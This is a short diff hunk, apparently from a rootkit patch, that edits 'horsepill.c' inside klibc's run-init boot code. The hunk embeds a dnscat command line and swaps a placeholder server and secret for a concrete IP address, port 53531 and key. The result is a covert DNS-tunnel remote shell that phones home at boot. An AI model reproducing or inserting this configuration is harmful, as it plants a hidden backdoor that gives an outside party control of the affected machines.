@@ -12333,9 +12333,9 @@ Index: klibc-2.0.7/usr/kinit/run-init/horsepill.c
 +char dnscat_cmdline[DNSCATCMDLINE_LEN] __attribute__ ((section ("DNSCMDLINE"))) = {
 +	"dnscat\0"
 +	"--dns\0"
-+	"server=xxx.xxx.xxx.xxx,port=53\0"
-+	"--secret=fa11fa11fa11fa11fa11fa11fa11fa11"
-+	"\0\0YOU SHOULD CHANGE TO ABOVE TO CONNECT TO YOUR OWN SERVER"
++	"server=10.220.190.238,port=53531\0"
++	"--secret=31bf481b857834600556f5ab3761561e"
++	
 +};
 +
 +pid_t init_pid;
